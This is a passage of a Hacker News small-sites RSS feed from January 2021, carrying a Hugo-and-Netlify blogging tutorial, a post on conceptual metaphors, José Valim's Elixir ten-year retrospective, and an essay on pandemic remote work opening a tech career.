0.411-0.702 0.649-0.172 0.154-0.367 0.328-0.583 0.525-0.624 0.569-0.55 1.235-0.484 1.822zM1.001 9.923c0.108 0.019 0.224 0.042 0.344 0.067 0.562 0.12 0.825 0.228 0.94 0.289-0.053 0.103-0.16 0.255-0.231 0.355-0.247 0.351-0.555 0.788-0.438 1.269 0.079 0.325 0.012 0.723-0.103 1.091-0.332-0.938-0.513-1.946-0.513-2.996 0-0.026 0.001-0.051 0.001-0.077zM10 19c-3.425 0-6.41-1.924-7.93-4.747 0.262-0.499 0.748-1.603 0.521-2.569 0.016-0.097 0.181-0.331 0.28-0.472 0.271-0.385 0.608-0.863 0.358-1.37-0.175-0.356-0.644-0.596-1.566-0.804-0.214-0.048-0.422-0.087-0.599-0.118 0.536-4.455 4.338-7.919 8.935-7.919 1.578 0 3.062 0.409 4.352 1.125-0.319-0.139-0.608-0.161-0.84-0.161-0.127 0-0.253 0.007-0.375 0.015-0.119 0.007-0.242 0.014-0.364 0.014-0.284 0-0.638-0.034-1.112-0.287-0.724-0.385-1.266-0.55-1.812-0.55-0.676 0-1.362 0.262-2.293 0.876-0.805 0.531-1.411 1.343-1.707 2.288-0.289 0.921-0.258 1.864 0.087 2.654 0.407 0.932 0.944 1.348 1.742 1.348 0 0 0 0 0 0 0.197 0 0.389-0.023 0.592-0.047 0.205-0.024 0.416-0.049 0.635-0.049 0.271 0 0.51 0.038 0.751 0.118 0.439 0.147 0.763 0.639 0.991 1.504s0.314 1.966 0.391 2.936c0.064 0.81 0.124 1.574 0.257 2.151 0.081 0.35 0.185 0.616 0.32 0.813 0.201 0.294 0.489 0.456 0.811 0.456 0.884 0 1.59-0.285 2.099-0.847 0.423-0.467 0.639-1.044 0.813-1.508 0.102-0.273 0.208-0.556 0.311-0.672 1.137-1.277 1.020-2.329 0.934-3.098-0.063-0.564-0.064-0.764 0.164-0.972 0.212-0.193 0.405-0.366 0.575-0.518 0.363-0.324 0.625-0.558 0.809-0.758 0.126-0.138 0.422-0.461 0.34-0.865-0.001-0.004-0.002-0.007-0.002-0.011 0.343 0.951 0.53 1.976 0.53 3.044 0 4.963-4.037 9-9 9z"></path></symbol><symbol id="Lineariconsicon-mic" viewBox="0 0 20 20"><title>mic</title><path d="M9.5 14c-1.93 0-3.5-1.57-3.5-3.5v-6c0-1.93 1.57-3.5 3.5-3.5s3.5 1.57 3.5 3.5v6c0 1.93-1.57 3.5-3.5 3.5zM9.5 2c-1.378 0-2.5 1.122-2.5 2.5v6c0 1.378 1.122 2.5 2.5 2.5s2.5-1.122 2.5-2.5v-6c0-1.378-1.122-2.5-2.5-2.5z"></path><path d="M16 10.5c0-0.276-0.224-0.5-0.5-0.5s-0.5 0.224-0.5 0.5c0 3.033-2.467 5.5-5.5 5.5s-5.5-2.467-5.5-5.5c0-0.276-0.224-0.5-0.5-0.5s-0.5 0.224-0.5 0.5c0 3.416 2.649 6.225 6 6.481v2.019h-1.5c-0.276 0-0.5 0.224-0.5 0.5s0.224 0.5 0.5 0.5h4c0.276 0 0.5-0.224 0.5-0.5s-0.224-0.5-0.5-0.5h-1.5v-2.019c3.351-0.256 6-3.065 6-6.481z"></path></symbol></defs></svg>
<svg style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<defs>














</defs>
</svg>






</div>]]>
            </description>
            <link>https://otherlife.co/strauss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776565</guid>
            <pubDate>Thu, 14 Jan 2021 14:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to create your blog with Gohugo and Netlify]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776555">thread link</a>) | @xavier_
<br/>
January 14, 2021 | https://angezanetti.com/posts/how-to-blog-gohugo-netlify-seo/ | <a href="https://web.archive.org/web/*/https://angezanetti.com/posts/how-to-blog-gohugo-netlify-seo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p>We all know that content marketing and SEO&nbsp;are the real winners when you want
to get some traffic in the long term. But it always sounds super complicated,
set up a blog, work on the SEO, pushes some content, etc…</p>

<p>For the last 2 years, I found a solution that really fits my needs and allows me
to have a blazing fast blog with no maintenance, good SEO&nbsp;performance and easy
to set up. It takes 30 minutes total and it’s free of charge.</p>

<p>I basically use it for every blog I own, like this one but also for my professional blogs (<a href="https://blog.remotefr.com/">job board</a> and <a href="https://blog.spreadtheworld.net/">launching strategy</a>).</p>

<p><em>Disclaimer:&nbsp;You need to know how to use Git/Github for this method. And you
also need to be OK with using the terminal</em></p>

<h2 id="a-static-site-generator">A static site generator</h2>

<p>The easiest way to publish content is to create some basic HTML files, without
any server interaction. A static site generator lets you write your article
offline and will generate all the HTML files afterward. All you need to do is
take these files and put them on a webserver.
There is plenty of SSG, I choose <a href="https://gohugo.io/">Hugo</a> a few years ago
because it’s one of the faster and because the community is huge - that’s super
useful for plugins or themes.</p>

<p>Let’s see how to install Hugo and create your blog:</p>

<h3 id="install">Install</h3>

<p>First, you’ll need to install it on your computer (remember, everything is done
offline)
I’m running a MacOS so all I&nbsp;need to do is:</p>

<p><code>brew install hugo</code>
<em>If you have another OS check their <a href="https://gohugo.io/getting-started/installing">install
doc</a></em></p>

<p>Then, create a new site:</p>

<p><code>hugo new site myblog</code></p>

<h3 id="a-seo-friendly-theme">A SEO friendly theme</h3>

<p>Most of us create a blog to get some traffic, to improve our SEO. The very
important tip here is to be super cautious of your theme choice.
What I do is:</p>

<ol>
<li>Choosing a theme based on the functionality/appearance.</li>
<li>Open the demo with Chrome</li>
<li>Check the SEO&nbsp;score on LightHouse.</li>
<li>Good themes has 90, <sup>95</sup>⁄<sub>100</sub> on Lighthouse. <strong>DO&nbsp;NOT&nbsp;USE&nbsp;OTHERS</strong></li>
</ol>

<p>If you really want a theme with a bad SEO score, you can fork it and make the
modification on your own repo. That’s what I made for my <a href="https://github.com/angezanetti/hugo-log">theme</a>.</p>

<p>Once you choose your theme, let’s add it to your blog:</p>

<pre><code>cd quickstart
git init
git submodule add https://github.com/angezanetti/hugo-log themes/hugo-log
</code></pre>

<p>Then, last step, update the config file:</p>

<p><code>echo 'theme = "hugo-log"' &gt;&gt; config.toml</code></p>

<p>Make sure to check the configuration file of the theme, especially for a theme SEO&nbsp;focused, you’ll have some extra
infos to fill.</p>

<p>And that’s it, you configured your new blog!</p>

<h3 id="create-some-content">Create some content</h3>

<p>To create a new post we run:</p>

<p><code>hugo new posts/my-first-post.md</code></p>

<p>That will generate a new markdown file, open it, and start writing. On the top
of the markdown file you should find something like:</p>

<pre><code>---
title: "My First Post"
date: 2019-03-26T08:47:11+01:00
draft: true
description: my desc is awesome
toc: false
images:
tags:
  - tag1
  - tag2
  - ...
---
</code></pre>

<p>That’s the metadata of your post, as well as the status of it. <code>draft: true</code>
means that the post is a WIP and won’t be posted to the production version.
Now, we’ll “build” the blog to see how it will show once online:</p>

<p><code>hugo server -D</code> <em>-D is for development</em></p>

<p>Open <code>localhost:1313</code> and you’ll see the first version of your blog!</p>

<p>Let’s see how we can publish it now.</p>

<h2 id="publish-your-blog-for-free">Publish your blog for free</h2>

<p>The big advantage of having static files only is:&nbsp;it’s super easy (and cheap)
to host. We’ll do it with <a href="https://www.netlify.com/">Netlify</a>. The Starter plan is free and more than
enough for most of our blogs. You can create as many website as you want, as
soon as your traffic doesn’t exceed 100Gb(!).</p>

<p>So first, create an account on app.netlify.com, then it will ask you to connect
your GitHub/Gitlab account to it (push your blog to it beforehand).</p>

<p>To create a new site, Select <code>New site from git.</code>, select your blog repository
and try to build it.</p>

<p>It should fail! Because we need to tell to Netlify how to build our blog, just
add this file to the root of your project:</p>

<pre><code>[build]
publish = "public"
command = "hugo --gc --minify"

[context.production.environment]
HUGO_VERSION = "0.55.6"
HUGO_ENV = "production"
HUGO_ENABLEGITINFO = "true"
</code></pre>

<p>Now, try to build it again and you should be good!</p>

<p>You can now set up a (sub)domain for it, Netlify also provide you a
SSL&nbsp;certificate (for free).</p>

<p>And that’s it! You now have a brand new blog, super-fast, resilient, no
maintenance and for free!</p>

<p><strong>→ If you want more tips about blogging &amp;&nbsp;indiehacking follow me on <a href="https://twitter.com/angezanetti">Twitter</a></strong></p>

			</div></div>]]>
            </description>
            <link>https://angezanetti.com/posts/how-to-blog-gohugo-netlify-seo/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776555</guid>
            <pubDate>Thu, 14 Jan 2021 14:23:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Think in Conceptual Metaphors]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776542">thread link</a>) | @jugjug
<br/>
January 14, 2021 | https://marcel.is/we-think-in-conceptual-metaphors/ | <a href="https://web.archive.org/web/*/https://marcel.is/we-think-in-conceptual-metaphors/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the book <a href="https://www.goodreads.com/book/show/34459.Metaphors_We_Live_By">The Metaphors to Live By</a>, the authors observe that we think and write and communicate in conceptual metaphors. Here are a few examples:</p>
<ul>
<li><strong>Conscious is up, unconscious is down</strong>: Get <em>up</em>. She <em>rises</em> early in the morning. He <em>fell</em> asleep. He's <em>under</em> hypnosis. He <em>sank into</em> a coma.</li>
<li><strong>Good is up, bad is down</strong>: We hit a <em>peak</em> last year, but it's been <em>downhill</em> ever since. Things are at an all-time <em>low</em>. He does <em>high</em>-quality work.</li>
<li><strong>Argument is a building</strong>: That is the <em>foundation</em> of our theory. The theory needs more <em>support</em>. The argument is <em>shaky</em>, it <em>falls apart</em>. We need to <em>construct</em> a strong argument.</li>
<li><strong>Argument is a battle</strong>: Your claims are <em>indefensible</em>. He <em>attacked</em> every <em>weak</em> point. His criticisms were on <em>target</em>. We need to <em>aim</em> for concision. They have a <em>strategy</em>.</li>
<li><strong>Argument is a container</strong>: Your argument doesn't have much <em>content</em>. That argument <em>has holes in it</em>. His objections have <em>less substance</em>. Your arguments are <em>empty</em>.</li>
<li><strong>Argument is a journey</strong>: We have <em>set out</em> to prove that. <em>So far</em>, we've seen that theories will not work. We will <em>proceed</em> in a <em>step-by-step</em> fashion. We have <em>arrived</em> at a conclusion. We are at a  <em>crossroad</em>.</li>
<li><strong>A problem is a body of water</strong>: He <em>dived into</em> the problem. He  <em>immersed</em> himself in the problem. The problem is <em>murky</em>. Finally the answer <em>surfaced</em>.</li>
<li><strong>A problem is a region in a landscape</strong>: We've got to <em>explore</em> this problem. Let's <em>map out</em> the problem before doing anything else. We're <em>heading</em> in the right direction. The solution <em>lies far ahead</em>.</li>
<li><strong>Ideas are food</strong>: That's <em>food for thought.</em> We don't need to <em>spoon-feed</em> our students. This is the <em>meaty</em> part of the paper.  There are too many facts to <em>digest</em>.</li>
<li><strong>Ideas are cutting instruments</strong>: That's an <em>incisive</em> idea. That <em>cuts right</em> to the heart of the matter. He's <em>sharp</em>. He has a <em>razor</em> wit.</li>
<li><strong>Ideas are plants</strong>: The <em>seeds</em> of his ideas were <em>planted</em> in his youth. She has a <em>fertile</em> imagination. Mathematics has many <em>branches</em>. Here's an idea I'd like to <em>plant</em> in your mind.</li>
</ul>
<p>It turns out <a href="http://www.lang.osaka-u.ac.jp/~sugimoto/MasterMetaphorList/metaphors/index.html">there are</a> <a href="https://metaphor.icsi.berkeley.edu/pub/en/index.php/Category:Metaphor">catalogs</a> of conceptual metaphors. We use them all the time. For example, also in the <a href="https://jvns.ca/blog/2020/05/08/metaphors-in-man-pages/">man pages</a>.</p>
<hr>
<p>Thanks for reading. Subscribe via <a href="https://buttondown.email/krcah">email or RSS</a>,
or <a href="https://twitter.com/mkrcah">follow me on Twitter</a>!</p></div></div>]]>
            </description>
            <link>https://marcel.is/we-think-in-conceptual-metaphors/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776542</guid>
            <pubDate>Thu, 14 Jan 2021 14:22:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[10 years-ish of Elixir]]>
            </title>
            <description>
<![CDATA[
Score 395 | Comments 113 (<a href="https://news.ycombinator.com/item?id=25776525">thread link</a>) | @1_player
<br/>
January 14, 2021 | https://dashbit.co/blog/ten-years-ish-of-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/ten-years-ish-of-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> January 11th, 2021
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/elixir">elixir</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/broadway">broadway</a>, <a href="https://dashbit.co/blog/tags/nerves">nerves</a>, <a href="https://dashbit.co/blog/tags/liveview">liveview</a>, <a href="https://dashbit.co/blog/tags/membrane">membrane</a>
  </li>
</ul>
<p>
This past weekend, on January 9th, we celebrated 10 years since <a href="https://github.com/elixir-lang/elixir/commit/337c3f2d569a42ebd5fcab6fef18c5e012f9be5b">the first commit to the Elixir repository</a>. While I personally don’t consider <a href="https://elixir-lang.org/">Elixir</a> to be 10 years old yet - the language that became what Elixir is today <a href="https://github.com/elixir-lang/elixir/commit/6052352b6281752b905b30eb5b08fac0f51f68cd">surfaced only 14 months later</a> - a decade is a mark to celebrate!</p>
<p>
The goal of this post is to focus on the current state of some projects in the ecosystem and then briefly highlight a few of the exciting efforts coming over the next months.</p>
<h2>
Recap: The language goals</h2>
<p>
When I started working on Elixir, I personally had the ambition of using it for building scalable and robust web applications. However, I didn’t want Elixir to be tied to the web. My goal was to design an <em>extensible</em> language with a diverse ecosystem. Elixir aims to be a general purpose language and allows developers to extend it to new domains.</p>
<p>
Given Elixir is built on top of Erlang and Erlang is used for networking and distributed systems, Elixir would naturally be a good fit in those domains too, as long as I didn’t screw things up. The Erlang VM is essential to everything we do in Elixir, which is why <em>compatibility</em> has become a language goal too.</p>
<p>
I also wanted the language to be <em>productive</em>, especially by focusing on the tooling. Learning a functional programming language is a new endeavor for most developers. Consequently their first experiences getting started with the language, setting up a new project, searching for documentation, and debugging should go as smoothly as possible.</p>
<p>
Extensibility, compatibility, and productivity are the goals we built the language upon.</p>
<h2>
Recap: Elixir in production</h2>
<p>
Last year we started <a href="https://elixir-lang.org/cases.html">a series of articles on companies using Elixir in production on the official website</a>. As of today, we have 7 production cases listed with more coming this year! Overall it is very exciting to see many different companies using a variety of business models and industries running Elixir in production.</p>
<p>
Companies like <a href="https://www.brex.com/">Brex</a> (<a href="https://elixir-lang.org/blog/2020/06/23/growing-with-elixir-at-brex/">case</a>), <a href="https://discord.com/">Discord</a> (<a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">case</a>), <a href="https://getdivvy.com/">Divvy</a>, <a href="https://www.podium.com/">Podium</a>, and <a href="https://salesloft.com/">SalesLoft</a> have reached <a href="https://en.wikipedia.org/wiki/Unicorn_(finance)">“unicorn status”</a> and rely heavily on Elixir. Startups like <a href="https://www.joinblvd.com/">Boulevard</a> (<a href="https://soundcloud.com/elixirtalk/episode-166-feat-sean-stavropoulos">podcast</a>), <a href="https://community.com/">Community</a>, <a href="https://duffel.com/">Duffel</a> (<a href="https://elixir-lang.org/blog/2020/12/10/integrating-travel-with-elixir-at-duffel/">case</a>), <a href="https://www.ockam.io/">Ockam</a>, <a href="https://www.mux.com/">Mux</a>, <a href="https://ramp.com/">Ramp</a>, <a href="https://remote.com/">Remote</a>, and <a href="https://www.v7labs.com/">V7</a> (<a href="https://elixir-lang.org/blog/2021/01/13/orchestrating-computer-vision-with-elixir/">case</a>) also use Elixir and have received funding in the last year or two. Elixir is also used within known brands and enterprises such as <a href="https://bleacherreport.com/">Bleacher Report</a>, <a href="https://www.change.org/">Change.org</a> (<a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">case</a>), <a href="https://heroku.com/">Heroku</a> (<a href="https://elixir-lang.org/blog/2020/09/24/paas-with-elixir-at-Heroku/">case</a>), <a href="https://www.pagerduty.com/">PagerDuty</a>, <a href="https://www.pepsico.com/">PepsiCo</a>, and <a href="https://www.therealreal.com/">TheRealReal</a>.</p>
<p>
There is also a special category of startups that run Elixir alonside an open source model, such as <a href="https://plausible.io/">Plausible Analytics</a>, <a href="https://app.supabase.io/">Supabase</a>, <a href="https://logflare.app/">Logflare</a> (<a href="https://runninginproduction.com/podcast/11-logflare-is-a-log-management-and-event-analytics-platform">podcast</a>), and <a href="https://hex.pm/">Hex.pm</a> (<a href="https://runninginproduction.com/podcast/19-hexpm-is-elixirs-official-package-manager">podcast</a>) itself. Still on the open source front, you will find projects like <a href="https://pleroma.social/">Pleroma</a> and <a href="https://changelog.com/">Changelog</a>. There also many small scale and hobby projects that use Elixir for a productive and joyful development experience.</p>
<h2>
Recap: Diverse ecosystem</h2>
<p>
Today, Elixir has a diverse ecosystem that works on a wide range of domains and industries. Let’s take a look at some examples.</p>
<h3>
Web</h3>
<p>
Most developers are familiar with using Elixir for web development thanks to <a href="https://phoenixframework.org/">the Phoenix web framework</a>. Phoenix gained traction in the ecosystem because it was the first to fully leverage the language and the platform for building real-time applications besides the usual MVC (Model-View-Controller) offering.</p>
<p>
It all started with Phoenix Channels, as a bi-directional communication between clients and servers, and Phoenix PubSub, which uses Erlang’s distributed compatibilities to broadcast messages across nodes. As far as I know, Phoenix was the first major web framework to provide a multi-node web real-time solution completely out-of-the-box. Regardless if you are using one node or ten nodes, everything just works, with minimal configuration and dependencies.</p>
<p>
Phoenix has matured a lot since its first stable release. Phoenix v1.2 included <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Phoenix Presence</a>, that allows developers to track which users, IoT devices, etc are connected to your cluster right now. No databases or external dependencies required! This is one of the problems that look deceptively simple at first, but once you outline all scalability, performance, and fault-tolerance requirements, it <a href="https://elixir-lang.org/blog/2020/11/17/real-time-collaboration-with-elixir-at-slab/">becomes quite complex</a>. Luckily, Phoenix is running on a platform that excels at these problems, and I am not aware of any other framework that provides such a lean and elegant solution as part of its default stack.</p>
<p>
Most recently, <a href="https://github.com/phoenixframework/phoenix_live_view">Phoenix LiveView</a> was released and brought new ways to build rich, real-time user experiences with server-rendered HTML, inspiring developers to attempt similar solutions for other languages and frameworks. You can read the <a href="https://dockyard.com/blog/2018/12/12/phoenix-liveview-interactive-real-time-apps-no-need-to-write-javascript">original announcement</a> or <a href="https://www.phoenixframework.org/blog/build-a-real-time-twitter-clone-in-15-minutes-with-live-view-and-phoenix-1-5">learn how to build a real-time Twitter clone in 15 minutes</a>. As part of the <em>Live</em> family, we have also announced <a href="https://twitter.com/josevalim/status/1250846714665357315">Phoenix LiveDashboard</a>, making monitoring and instrumentation a first-class citizen for Phoenix applications.</p>
<h3>
Embedded and IoT</h3>
<p>
While I always expected Elixir to shine for building web applications, I was taken by surprise when I heard about the <a href="https://www.nerves-project.org/">Nerves platform</a> for creating high-end embedded applications. However, once I learned their premise, it all made sense: writing embedded systems <em>is</em> complicated. Reasoning about failures is hard. So what if we could leverage the decades of lessons learnt by Erlang/OTP to design embedded applications? What if a fault on the Wi-Fi driver could be fixed by having a supervisor simply restart it? After all, the first major use of Erlang/OTP was in an embedded system, the Ericsson AXD301 ATM switch.</p>
<p>
Nerves brings the Elixir ecosystem and the battle-tested Erlang VM to edge computing, providing a rich developer experience using proven technology. Nerves started as a one step process for turning an Elixir project into a complete software image for common hardware devices. Today, Nerves is being used in production in industrial automation, machine learning, consumer electronics and more, with <a href="https://farm.bot/">Farmbot</a> (<a href="https://elixir-lang.org/blog/2020/08/20/embedded-elixir-at-farmbot/">case</a>) and <a href="https://www.rosepoint.com/">Rose Point Navigation</a> being two of the most notable examples.</p>
<p>
The Nerves team also created <a href="https://www.nerves-hub.org/">NervesHub</a>, a fully open-source device management system. Combining all these technologies makes Elixir a comprehensive language for building end-to-end IoT platforms.</p>
<h3>
Data ingestion and pipelines</h3>
<p>
Shortly after Elixir v1.0 was released, the Elixir Core Team and I started looking into abstractions for tackling data ingestions and data pipelines in Elixir. We ran through a couple designs until we eventually <a href="https://elixir-lang.org/blog/2016/07/14/announcing-genstage/">landed on GenStage</a>: a behaviour for exchanging data with back-pressure between Elixir processes and external systems. For an introduction, make sure to check out <a href="https://youtu.be/srtMWzyqdp8?t=242">my keynote introducing both GenStage and Flow</a>.</p>
<p>
Today, almost 5 years later, GenStage has been used by many industries and has become one of the factors driving Elixir adoption. For example, you can read how both <a href="https://elixir-lang.org/blog/2020/10/08/real-time-communication-at-scale-with-elixir-at-discord/">Discord</a> and <a href="https://elixir-lang.org/blog/2020/10/27/delivering-social-change-with-elixir-at-change.org/">Change.org</a> have built systems on Elixir and GenStage that handle spikes and run at massive scale.</p>
<p>
However, GenStage was just the beginning. In 2019, <a href="https://www.youtube.com/watch?v=ZOExnT1PYjs">we announced Broadway</a>, which is a higher-level abstraction on top of GenStage that makes building data ingestion pipelines a breeze. We originally released with Amazon SQS support. Nowadays, RabbitMQ, Google Cloud PubSub, Apache Kafka, and other sources (known as producers in Broadway terms) are also available.</p>
<h3>
Audio/Video streaming</h3>
<p>
Since the Erlang VM was designed for scalable network processing, one can expect to also be an excellent platform for audio and video streaming. However, if you also wanted to process and transform those streams on the fly, the situation becomes much more complicated as you likely have to integrate with native code.</p>
<p>
Luckily, the tables have turned when Erlang/OTP 20 was released a couple years ago with the so-called Dirty NIFs. The Erlang VM always had the ability to invoke native code, but this native code could not run for long, as to not interfere with the preemptive features of the Erlang runtime. Dirty NIFs allow developers to tag native code either as IO or CPU bound, which runs on specific threads. Between ports (I/O based), NIFs, Dirty NIFs, and remote nodes, developers now have many options to interface with native code with different performance and reliability guarantees. That’s exactly the foundation the <a href="http://www.membraneframework.org/">Membrane Framework</a> builds on top of.</p>
<p>
Membrane was extracted from RadioKit, a startup aiming at disrupting the radio broadcasting industry. Originally it focused on processing and mixing audio. Later, <a href="https://www.swmansion.com/">Software Mansion</a> acquired the framework and provided stable funding and a solid team to help it grow into a full-scale framework. Currently, it allows developers to process, transmit, broadcast, and transform audio and videos streams on the fly. Whether you are building a Twitch clone, a VOD application or a video conferencing system, Membrane provides a growing set of high-level abstractions and pre-made modules so you don’t have to dive into idiosyncrasies of particular codecs, protocols, and formats. </p>
<h2>
Looking ahead: what is coming in 2021</h2>
<p>
The year of 2021 looks very exciting for the Erlang Ecosystem and the Elixir community. In this section, we are going to mention some of the things we expect to see in 2021.</p>
<h3>
Erlang/OTP 24 with JIT</h3>
<p>
In September 2020, <a href="https://github.com/erlang/otp/pull/2745">Lukas Larsson and the Erlang/OTP team</a> announced a JIT compiler for the Erlang VM called BeamAsm. How faster the JIT will be in practice depends on your application but the results posted in the announcement are promising. To quote Lukas:</p>
<blockquote>
  <p>
If we run the JSON benchmarks found in the <a href="https://github.com/devinus/poison/tree/master/bench">Poison</a> or <a href="https://github.com/michalmuskala/jason/tree/master/bench">Jason</a>, BeamAsm achieves anything from 30% to 130% increase (average at about 70%) in the number of iterations per second for all Erlang/Elixir implementations. For some benchmarks, BeamAsm is even faster than the pure C implementation <a href="https://github.com/davisp/jiffy">jiffy</a>.  </p>
</blockquote>
<blockquote>
  <p>
More complex applications tend to see a more moderate performance increase, for instance, RabbitMQ is able to handle 30% to 50% more messages per second depending on the scenario.  </p>
</blockquote>
<p>
I have been running …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/ten-years-ish-of-elixir">https://dashbit.co/blog/ten-years-ish-of-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/ten-years-ish-of-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776525</guid>
            <pubDate>Thu, 14 Jan 2021 14:21:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the pandemic opened the door to my career in tech]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776449">thread link</a>) | @RyanShook
<br/>
January 14, 2021 | https://nikemaprophet.com/how-the-pandemic-opened-the-door-to-my-career-in-tech/ | <a href="https://web.archive.org/web/*/https://nikemaprophet.com/how-the-pandemic-opened-the-door-to-my-career-in-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The 2020 coronavirus pandemic played a part in reducing the access gap for parents (with caregiving responsibilities), disabled people, and neurodivergent people in tech. I’m a member of each of those marginalized groups, plus some.</p>



<p>Tech’s quick transition to remote work for all created a sliver of an opening in a door I’ve been knocking on for years.</p>



<p>Landing your first full-time tech role is not a trivial task. Some of us have more barriers than others to overcome. It doesn’t make intuitive sense, but the timing of the pandemic was beneficial to my job search. I was helped by the more inclusive hiring and work practices that companies adopted as a matter of survival.</p>



<h2><strong>Working on a distributed team is no longer exceptional</strong></h2>



<p>When it became clear in early 2020 that it was no longer safe to work in close physical proximity, companies made the right decision to close offices and have their people work from home. Co-located teams that weren’t prepared for this shift had to get it together without the luxury of time to optimize the experience.</p>



<p>Companies kept hiring through the crisis. Because everyone who could went home,&nbsp; more junior employees and new hires joined the distributed workforce. It wasn’t exceptional anymore, it was table stakes.</p>



<h3><strong>My challenges were exceptional</strong></h3>



<p>I come from what tech culture is calling a “non-traditional” background. I’m a Black single-mother in my late 30s. I don’t have a degree at all and my primary job for the last 13 years has been “stay-at-home mom.” Those traits alone were enough to make me a lot different than the most sought-after job candidates, and the attributes I listed are just the broad categories of marginalized groups I belong to.</p>



<p>With a closer look, you could see that I was low-income, financially strained, and suffering the effects of untreated health conditions and undiagnosed ADHD. I was homeschooling my two school-aged children. As a single parent, that meant they would be a constant presence in my home, the same home I was hoping to make my workplace.</p>



<p>I didn’t show up at tech’s door empty-handed. I have been programming and building web pages for decades. I went to school, earned college credits and a certificate in Web Development in the early 2010s. In the most recent years, I learned modern web development as a self-directed learner (with some time in a coding school) and built communities with my peers who were also on a path to their first tech roles.</p>



<p>I never considered working a tech role from an office, not even 13 years ago when I started my certificate program. Remote work was the only option. I was confident that I could thrive while working from home. I even had practical experience as a developer on a distributed team thanks to<a href="https://the-collab-lab.codes/"> The Collab Lab</a>.</p>



<p>Finding a remote-friendly role for my first tech job was difficult. The positions that I qualified for were few and far between. Tech culture seemed to be telling me that this mode of working was a perk reserved for current employees and more senior candidates.</p>



<h3><strong>The Pandemic Opened a Door</strong></h3>



<p>The pandemic helped my job search situation by giving <strong>everyone</strong> a taste of the challenges I’ve been living with and working around for years.</p>



<p>Social expectations had to shift. We were all doing our best to navigate a deadly, airborne virus. This meant mass trauma. Knowledge workers rushed home before everyone knew exactly how that was supposed to work. Schools closed and parents had double-duty as employees and homeschooling teachers. We were all humans going through a difficult time – all of us in the same storm.</p>



<p>Pre-COVID, those were my exact conditions (except for the deadly virus part). Before the pandemic, I was enduring a personal storm while the weather was fine for others with the same aspirations I had.</p>



<p>I can’t imagine that hiring managers came across many people like me or in similar situations to mine. Not only was I a “non-traditional” candidate, but I also had conditions and challenges. Multiple people would have to look past those challenges with empathy and really <strong>want</strong> to give me a chance. I wasn’t an easy candidate to say yes to.</p>



<p>In a world where remote work wasn’t table stakes, I could be singled out as a person who was needier than most. Remember, it was remote or nothing for me. COVID changed that making me one of many with common needs.</p>



<p>We all experienced the pandemic at once. To use the storm analogy, some were better equipped to weather the storm than others, but we were all in it. We were dealing with sickness, death, trauma, and fear. People needed grace and understanding from one another. It’s easier to offer that to others when you have first-hand experience to draw from.</p>



<p>This climate provided the opportunity I needed. I was not okay and I was getting desperate. I needed the grace and accommodation that was suddenly and necessarily afforded to everyone. Nothing being normal made my abnormalities less prominent.</p>



<p>I had a better chance of being seen for what I had to offer without my mess of a life blocking the view. Pandemic life is hard and messy for everyone. This was another opportunity for my, usually abnormal, normal to blend into the crowd. I was used to having kids around while I worked, wearing many hats, showing emotional sensitivity, and spending most of my time at home. For years, that was my life entirely.</p>



<h3><strong>Keep This Door Open</strong></h3>



<p>I hope weathering the storm together turns up the empathy dial in our tech culture. It took a pandemic for me to have the slightest chance to start my career.</p>



<p>Even if that’s just my perception of reality, that’s unacceptable, isn’t it? Consider what I must have gone through to come to that conclusion. While you can’t wait to get back to normal and business as usual, your normal was hell for me. Your normal erased and devalued me.</p>



<p>I’m here now, adding value in ways only I can. I belong in this industry, like many others who will knock on doors until their knuckles bleed, then turn away defeated, never to return. If the pandemic is what it took to open doors that were bolted shut, don’t let the doors close once our fear for our lives subsides.</p>



<p>Let’s learn something from this. Let’s think beyond the short term and stretch our imaginations to think of ways to improve employee experiences across tech. Let’s keep the awareness that systemic inequity means that people we need in tech have shown up to work and can’t get in.</p>



<p>Better yet, if you are in a position to do so, throw the door open and welcome folks in. We didn’t show up empty-handed, and we’re not asking you to lower the bar. We bring skills, experience, and diverse perspectives. Don’t make us fight and bleed for an opportunity to participate. I promise you that tech and the world that it touches will be better off for it.</p>
</div></div>]]>
            </description>
            <link>https://nikemaprophet.com/how-the-pandemic-opened-the-door-to-my-career-in-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776449</guid>
            <pubDate>Thu, 14 Jan 2021 14:14:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The no-nonsense guide to IaC and Terraform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776349">thread link</a>) | @deletriusotis
<br/>
